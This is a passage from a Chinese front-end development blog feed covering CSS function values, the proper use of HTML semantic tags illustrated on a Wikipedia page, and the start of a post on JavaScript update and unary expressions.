属性。</li><li>百分比：大部分维度都支持。</li><li>颜色：比如 background-color 属性。</li><li>图片：比如 background-image 属性。</li><li>2D 位置：比如 background-position 属性。</li><li>函数：来自函数的值，比如 transform 属性。</li></ul><p>这里我们要重点介绍一下函数。一些属性会要求产生函数类型的值，比如 easing-function 会要求 cubic-bezier() 函数的值：</p><p>CSS 支持一批特定的计算型函数：</p><ul><li>calc()</li><li>max()</li><li>min()</li><li>clamp()</li><li>toggle()</li><li>attr()</li></ul><p><strong>calc()</strong> 函数是基本的表达式计算，它支持加减乘除四则运算。在针对维度进行计算时，calc() 函数允许不同单位混合运算，这非常的有用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">section</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">1em</span>; <span class="attribute">border</span>: solid <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span>/<span class="number">3</span> - <span class="number">2</span>*<span class="number">1em</span> - <span class="number">2</span>*<span class="number">1px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**max()、min() 和 clamp() **则是一些比较大小的函数，max() 表示取两数中较大的一个，min() 表示取两数之中较小的一个，clamp() 则是给一个值限定一个范围，超出范围外则使用范围的最大或者最小值。</p><p>toggle() 函数在规则选中多于一个元素时生效，它会在几个值之间来回切换，比如我们要让一个列表项的样式圆点和方点间隔出现，可以使用下面代码：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ul</span> &#123; <span class="built_in">list-style-type:</span> <span class="string">toggle</span>(<span class="string">circle</span>, <span class="string">square</span>); &#125;</span><br></pre></td></tr></table></figure><p>attr() 函数允许 CSS 接受属性值的控制。</p><h4 id="ps：剩余一些函数（分类可能并不准确）"><a href="#ps：剩余一些函数（分类可能并不准确）" class="headerlink" title="ps：剩余一些函数（分类可能并不准确）"></a>ps：剩余一些函数（分类可能并不准确）</h4><h5 id="1-图片"><a href="#1-图片" class="headerlink" title="1. 图片"></a>1. 图片</h5><ul><li>filter<ul><li>blur()</li><li>brightness()</li><li>contrast()</li><li>drop-shadow()</li><li>grayscale()</li><li>hue_rotate()</li><li>invert()</li><li>opacity()</li><li>saturate()</li><li>sepia()</li></ul></li><li>cross-fade()</li><li>element()</li><li>image-set()</li><li>imagefunction()</li></ul><h5 id="2-图形绘制"><a href="#2-图形绘制" class="headerlink" title="2. 图形绘制"></a>2. 图形绘制</h5><ul><li>conic-gradient()</li><li>linear-gradient()</li><li>radial-gradient()</li><li>repeating-linear-gradient()</li><li>repeating-radial-gradient()</li><li>shape()</li></ul><h5 id="3-布局"><a href="#3-布局" class="headerlink" title="# 3. 布局"></a># 3. 布局</h5><ul><li>calc()</li><li>clamp()</li><li>fit-content()</li><li>max()</li><li>min()</li><li>minmax()</li><li>repeat()</li></ul><h5 id="4-变形-x2F-动画"><a href="#4-变形-x2F-动画" class="headerlink" title="# 4. 变形&#x2F;动画"></a># 4. 变形&#x2F;动画</h5><ul><li>transform<ul><li>matrix()</li><li>matrix3d()</li><li>perspective()</li><li>rotate()</li><li>rotate3d()</li><li>rotateX()</li><li>rotateY()</li><li>rotateZ()</li><li>scale()</li><li>scale3d()</li><li>scaleX()</li><li>scaleY()</li><li>scaleZ()</li><li>skew()</li><li>skewX()</li><li>skewY()</li><li>translate()</li><li>translate3d()</li><li>translateX()</li><li>translateY()</li><li>translateZ()</li></ul></li></ul><h5 id="5-环境与元素"><a href="#5-环境与元素" class="headerlink" title="# 5. 环境与元素"></a># 5. 环境与元素</h5><ul><li>var()</li><li>env()</li><li>attr()</li></ul>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13丨HTML&amp;CSS：div和span不是够用了吗？</title>
      <link href="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&amp;CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&amp;CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>在讲语义之前，我们来说说为什么要用语义。</p><p>现在我们很多的前端工程师写起代码来，多数都不用复杂的语义标签， 只靠 div 和 span 就能走天下了。</p><p>这样做行不行呢？毫无疑问答案是行。那这样做好不好呢？按照正确的套路，我应该说不好，但是在很多情况下，答案其实是好。</p><p>这是因为在现代互联网产品里，HTML 用于描述“软件界面”多过于“富文本”，而软件界面里的东西，实际上几乎是没有语义的。比如说，我们做了一个购物车功能，我们一定要给每个购物车里的商品套上 ul 吗？比如说，加入购物车这个按钮，我们一定要用 Button 吗？</p><p>实际上我觉得没必要，因为这个场景里面，跟文本中的列表，以及表单中的 Button，其实已经相差很远了，所以，我支持在任何“软件界面”的场景中，直接使用 div 和 span。</p><p><strong>不过，在很多工作场景里，语义类标签也有它们自己无可替代的优点。正确地使用语义标签可以带来很多好处。</strong></p><ul><li>语义类标签对开发者更为友好，使用语义类标签增强了可读性，即便是在没有 CSS 的时候，开发者也能够清晰地看出网页的结构，也更为便于团队的开发和维护。</li><li>除了对人类友好之外，语义类标签也十分适宜机器阅读。它的文字表现力丰富，更适合搜索引擎检索（SEO），也可以让搜索引擎爬虫更好地获取到更多有效信息，有效提升网页的搜索量，并且语义类还可以支持读屏软件，根据文章可以自动生成目录等等。</li></ul><p>不过，不恰当地使用语义标签，反而会造成负面作用。这里我们举一个常见的误区作为例子。我们都知道 ul 是无序列表，ol 是有序列表，所以很多接触过语义这个概念，半懂不懂的前端工程师，特别喜欢给所有并列关系的元素都套上 ul。</p><p>实际上， ul 是长成下面的这种样子的 (以下来自 HTML 标准)。</p><blockquote><p>I have lived in the following countries:</p><ul><li>Switzerland</li><li>Norway</li><li>United Kingdom</li><li>United States</li></ul></blockquote><p>ul 多数出现正在行文中间，它的上文多数在提示：要列举某些项。但是，如果所有并列关系都用 ul，会造成大量冗余标签。</p><p>错误地使用语义标签，会给机器阅读造成混淆、增加嵌套，给 CSS 编写加重负担。</p><p>所以，对于语义标签，我的态度是：<strong>“用对”比“不用”好，“不用”比“用错”好。当然了，我觉得有理想的前端工程师还是应该去追求“用对”它们。</strong></p><p>再来看一些标签</p><h5 id="aside"><a href="#aside" class="headerlink" title="aside"></a>aside</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img.png"></p><p>首先我们来看下，左侧侧边栏，根据上一篇文章中提到的语义定义，这里属于 aside 内容。是导航性质的工具内容。</p><h5 id="article"><a href="#article" class="headerlink" title="article"></a>article</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_1.png"></p><p>我们来到文章主体部分，因为主体部分具有明确的独立性，所以可以用 article 来包裹。</p><h5 id="hgroup-h1-h2"><a href="#hgroup-h1-h2" class="headerlink" title="hgroup, h1, h2"></a>hgroup, h1, h2</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_2.png"></p><p>hgroup 是标题组，h1 是一级标题，h2 是二级标题。这里，World Wide Web 是文章的大标题，适合 h1 元素。</p><p>接下来出现了一个副标题。From Wikipedia, the free encyclopedia。这个地方适合使用 h2，跟 h1 组成一个 hgroup，所以代码可能是类似这样的:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">hgroup</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">h1</span>&gt;World Wide Web &lt;/<span class="selector-tag">h1</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">h2</span>&gt;<span class="selector-tag">From</span> Wikipedia, the free encyclopedia&lt;/<span class="selector-tag">h2</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">hgroup</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="abbr"><a href="#abbr" class="headerlink" title="abbr"></a>abbr</h5><p>abbr 标签表示缩写。考虑到 WWW 是 World Wide Web 的缩写，所以文中所有出现的 WWW，都应该使用 abbr 标签。</p><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_3.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;World Wide Web&quot;</span>&gt;</span>WWW<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span>.</span><br></pre></td></tr></table></figure><h5 id="hr"><a href="#hr" class="headerlink" title="hr"></a>hr</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_4.png"></p><p>细心的同学会发现，在 Wiki 的界面中，出现了一条很长的横线，大家都知道 hr 标签表示横向分隔线，那么这个地方是不是应该用 hr 呢？</p><p>答案是不用。我们读一下标准的定义就知道了，hr 表示故事走向的转变或者话题的转变，显然此处两个标题并非这种关系，所以我们应该使用 CSS 的 border 来把它当作纯视觉效果来实现，所以这里是不需要用 hr 的。</p><h5 id="p"><a href="#p" class="headerlink" title="p"></a>p</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_5.png"></p><p>接下来一段，我们看到了三段“note”，也就是注记。它在文章中用作额外注释。</p><blockquote><p>“WWW” and “The Web” redirect here. For other uses of WWW, see WWW (disambiguation). For other uses of web, see Web (disambiguation).For the first web software, see WorldWideWeb.Not to be confused with the Internet.</p></blockquote><p>HTML 中并没有 note 相关的语义，所以，我们用普通的 p 标签，加上class&#x3D;”note”来实现。后面的多数自然段都是普通的段落，我们用 p 标签来实现。</p><h5 id="strong"><a href="#strong" class="headerlink" title="strong"></a>strong</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_6.png"></p><p>注意，这里 “World Wide Web (WWW)” 和 “the Web” 使用了黑体呈现，从上下文来看，这里表示这个词很重要，所以我们使用 strong 标签。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">p</span>&gt; </span><br><span class="line"><span class="selector-tag">A</span> global map of the web index for countries in <span class="number">2014</span></span><br><span class="line">&lt;<span class="selector-tag">strong</span>&gt;The World Wide Web (WWW)&lt;/<span class="selector-tag">strong</span>&gt;, also called &lt;<span class="selector-tag">strong</span>&gt;the Web&lt;/<span class="selector-tag">strong</span>&gt;,</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h5 id="blockquote-q-cite"><a href="#blockquote-q-cite" class="headerlink" title="blockquote, q, cite"></a>blockquote, q, cite</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_7.png"></p><p>接下来我们看到了一个论文中很常见的用法“引述”。</p><blockquote><p>interlinked by hypertext links, and accessible via the Internet.[1]</p></blockquote><p>注意看这里的[1]，当我们把鼠标放上去的时候，出现了引述的相关信息：</p><blockquote><p>“What is the difference between the Web and the Internet?”. W3C Help and FAQ. W3C. 2009. Archived from the original on 9 July 2015. Retrieved 16 July 2015.</p></blockquote><p>在 HTML 中，有三个跟引述相关的标签 blockquote 表示段落级引述内容，q 表示行内的引述内容，cite 表示引述的作品名。</p><p>这里的作品名称 “What is the difference between the Web and the Internet?”，应当使用 cite 标签。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;cite&gt;<span class="string">&quot;What is the difference between the Web and the Internet?&quot;</span>&lt;/cite&gt;. W3C Help <span class="keyword">and</span> FAQ. W3C. <span class="number">2009.</span> Archived <span class="built_in">from</span> <span class="keyword">the</span> original <span class="keyword">on</span> <span class="title">9</span> <span class="title">July</span> <span class="title">2015</span>. <span class="title">Retrieved</span> <span class="title">16</span> <span class="title">July</span> <span class="title">2015</span>.</span><br></pre></td></tr></table></figure><p>在文章的结尾处，有对应的 References 一节，这一节中所有的作品名称也应该加入 cite 标签。</p><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_8.png"></p><p>这里我们看看引用的原文就可以知道，Wiki 文章中的信息并非直接引用，如果是直接引用的内容，那么，我们还应该加上 blockquote 或者 q 标签。</p><h5 id="time"><a href="#time" class="headerlink" title="time"></a>time</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_9.png"></p><p>这里除了引用的文章外，还出现了日期，为了让机器阅读更加方便，可以加上 time 标签：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;cite&gt;<span class="string">&quot;What is the difference between the Web and the Internet?&quot;</span>&lt;/cite&gt;. W3C Help <span class="keyword">and</span> FAQ. W3C. <span class="number">2009.</span> Archived <span class="keyword">from</span> <span class="keyword">the</span> original <span class="keyword">on</span> &lt;<span class="built_in">time</span> datetime=<span class="string">&quot;2015-07-09&quot;</span>&gt;<span class="number">9</span> July <span class="number">2015</span>&lt;/<span class="built_in">time</span>&gt;. Retrieved &lt;<span class="built_in">time</span> datetime=<span class="string">&quot;2015-07-16&quot;</span>&gt;<span class="number">16</span> July <span class="number">2015</span>&lt;/<span class="built_in">time</span>&gt;.</span><br></pre></td></tr></table></figure><h5 id="figure-figcaption"><a href="#figure-figcaption" class="headerlink" title="figure, figcaption"></a>figure, figcaption</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_10.png"></p><p>我们注意一下文章的右侧，出现了几张图片，这种出现在文中的图片，不仅仅是一个 img 标签，它和下面的文字组成了一个 figure 的语法现象，figure 也是我们的一种标签（用于表示与主文章相关的图像、照片等流内容）。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://.....440px-NeXTcube_first_webserver.JPG&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>The NeXT Computer used by Tim Berners-Lee at CERN.<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种插入文章中的内容，不仅限图片，代码、表格等，只要是具有一定自包含性（类似独立句子）的内容，都可以用 figure。这里面，我们用 figcaption 表示内容的标题，当然，也可以没有标题。</p><h5 id="dfn"><a href="#dfn" class="headerlink" title="dfn"></a>dfn</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_11.png"></p><p>然后我们继续往下看，来注意这一句：</p><blockquote><p>The terms Internet and World Wide Web are often used without much distinction. However, the two are not the same. The Internet is a global system of interconnected computer networks. In contrast, the World Wide Web is a global collection of documents and other resources, linked by hyperlinks and URIs.</p></blockquote><p>这里分别定义了 Internet 和 World Wide Web，我们应该使用 dfn 标签。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The terms Internet <span class="keyword">and</span> World Wide Web are often used <span class="keyword">without</span> much distinction. However, <span class="keyword">the</span> <span class="literal">two</span> are <span class="keyword">not</span> <span class="keyword">the</span> same. </span><br><span class="line">The &lt;dfn&gt;Internet&lt;/dfn&gt; is <span class="keyword">a</span> <span class="built_in">global</span> <span class="keyword">system</span> <span class="keyword">of</span> interconnected computer networks.</span><br><span class="line">In contrast, <span class="keyword">the</span> &lt;dfn&gt;World Wide Web&lt;/dfn&gt; is <span class="keyword">a</span> <span class="built_in">global</span> collection <span class="keyword">of</span> documents <span class="keyword">and</span> other resources, linked <span class="keyword">by</span> hyperlinks <span class="keyword">and</span> URIs. </span><br></pre></td></tr></table></figure><p>代码中你可以看见，你需要在你要定义的词前后放上 dfn 标签，所以我们知道了，dfn 标签是用来包裹被定义的名词。</p><h5 id="nav-ol-ul"><a href="#nav-ol-ul" class="headerlink" title="nav, ol, ul"></a>nav, ol, ul</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_12.png"></p><p>接下来，几个普通的段落之后，我们看到了文章的目录。这里的目录链接到文章的各个章节，我们可以使用 nav 标签。因为这里的目录顺序不可随意变化，所以我们这里使用多级的 ol 结构。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Contents<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>History<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>Function<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>Linking<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>Dynamic updates of web pages<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们这里必须要指出，ol 和 ul 的区分是内容是否有顺序关系，每一项的前面不论是数字还是点，都不会影响语义的判断。所以，你可以注意一下这里，不要因为视觉表现效果，而改变语义的使用。</p><h5 id="pre-samp-code"><a href="#pre-samp-code" class="headerlink" title="pre, samp, code"></a>pre, samp, code</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_13.png"></p><p>继续往下，我们来到了这里，我们看见这篇文章有一个很重要的特色，文章中嵌入了一些代码和一些预先编写好的段落。我们看到在“Function”小节中有一段背景色是灰色的文字。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.org</span><br></pre></td></tr></table></figure><p>这是一段 HTTP 协议的内容描述，因为这段内容的换行是非常严格的，所以我们不需要浏览器帮我们做自动换行，因此我们<strong>使用了 pre 标签，表示这部分内容是预先排版过的，不需要浏览器进行排版</strong>。</p><p>又因为这是一段计算机程序的示例输出，所以我们可以使用 samp 标签：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;pre&gt;</span><span class="section">&lt;samp&gt;</span></span><br><span class="line"><span class="attribute">GET</span> /home.html HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: www.example.org</span><br><span class="line"><span class="section">&lt;/samp&gt;</span><span class="section">&lt;/pre&gt;</span></span><br></pre></td></tr></table></figure><p>接下来 Wiki 中的内容出现了一段 HTML 代码，我们同样不希望浏览器做自动换行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example.org – The World Wide Web<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>The World Wide Web, abbreviated as WWW and commonly known ...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为同时是代码，我们还需要加上 code 标签。最后的代码是 pre 标签包裹了 code 标签，code 标签包裹了 HTML 代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>html<span class="symbol">&amp;gt;</span></span><br><span class="line">  <span class="symbol">&amp;lt;</span>head<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>title<span class="symbol">&amp;gt;</span>Example.org – The World Wide Web<span class="symbol">&amp;lt;</span>/title<span class="symbol">&amp;gt;</span></span><br><span class="line">  <span class="symbol">&amp;lt;</span>/head<span class="symbol">&amp;gt;</span></span><br><span class="line">  <span class="symbol">&amp;lt;</span>body<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>p<span class="symbol">&amp;gt;</span>The World Wide Web, abbreviated as WWW and commonly known ...<span class="symbol">&amp;lt;</span>/p<span class="symbol">&amp;gt;</span></span><br><span class="line">  <span class="symbol">&amp;lt;</span>/body<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/html<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在后面的代码中，还有一些在行内的 code，比如 title 和 p 括起来的内容，这些也都应该使用 code 标签。</p><h5 id="剩余一些"><a href="#剩余一些" class="headerlink" title="剩余一些"></a>剩余一些</h5><p><img src="/Blog/2019/01/30/relearn_FE/13%E4%B8%A8HTML&CSS%EF%BC%9Adiv%E5%92%8Cspan%E4%B8%8D%E6%98%AF%E5%A4%9F%E7%94%A8%E4%BA%86%E5%90%97%EF%BC%9F/index/img_14.png"></p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12丨新加入的**运算符</title>
      <link href="/Blog/2019/01/29/relearn_FE/12%E4%B8%A8%E6%96%B0%E5%8A%A0%E5%85%A5%E7%9A%84%E2%80%BB%E2%80%BB%E8%BF%90%E7%AE%97%E7%AC%A6/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/12%E4%B8%A8%E6%96%B0%E5%8A%A0%E5%85%A5%E7%9A%84%E2%80%BB%E2%80%BB%E8%BF%90%E7%AE%97%E7%AC%A6/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在一些通用的计算机语言设计理论中，能够出现在赋值表达式右边的叫做：右值表达式（RightHandSideExpression），而在 JavaScript 标准中，规定了在等号右边表达式叫做条件表达式（ConditionalExpression），不过，在 JavaScript 标准中，从未出现过右值表达式字样。</p><p>JavaScript 标准也规定了左值表达式同时都是条件表达式（也就是右值表达式），此外，左值表达式也可以通过跟一定的运算符组合，逐级构成更复杂的结构，直到成为右值表达式。</p><p>关于这块的知识，我们有时会看到按照运算符来组织的讲解形式。<br>这样讲解形式是因为：对运算符来说的“优先级”，如果从我们语法的角度来看，那就是“表达式的结构”。讲“乘法运算的优先级高于加法”，从语法的角度看就是“乘法表达式和加号运算符构成加法表达式”。</p><p>对于右值表达式来说，我们可以理解为以左值表达式为最小单位开始构成的，接下来我们就来看看左值表达式是如何一步步构成更为复杂的语法结构。</p></blockquote><h2 id="更新表达式-UpdateExpression"><a href="#更新表达式-UpdateExpression" class="headerlink" title="更新表达式 UpdateExpression"></a>更新表达式 UpdateExpression</h2><p>左值表达式搭配 ++ – 运算符，可以形成更新表达式。</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">--</span> <span class="comment">a;</span></span><br><span class="line"><span class="literal">++</span> <span class="comment">a;</span></span><br><span class="line"><span class="comment">a</span> <span class="literal">--</span></span><br><span class="line"><span class="comment">a</span> <span class="literal">++</span></span><br></pre></td></tr></table></figure><p>更新表达式会改变一个左值表达式的值。分为前后自增，前后自减一共四种。</p><p>我们要注意一下，这里在 ES2018 中，跟早期版本有所不同，前后自增自减运算被放到了同一优先级。*(早期版本，后自增&#x2F;自减 运算符优先级大于 前自增&#x2F;自减。 ES2018 版本中，前后自增&#x2F;自减 运算符 是同一个优先级。)*</p><h2 id="一元运算表达式-UnaryExpression"><a href="#一元运算表达式-UnaryExpression" class="headerlink" title="一元运算表达式 UnaryExpression"></a>一元运算表达式 UnaryExpression</h2><p>更新表达式搭配一元运算符，可以形成一元运算表达式，我们看下例子：</p><figure class="highlight css"><table><tr><td 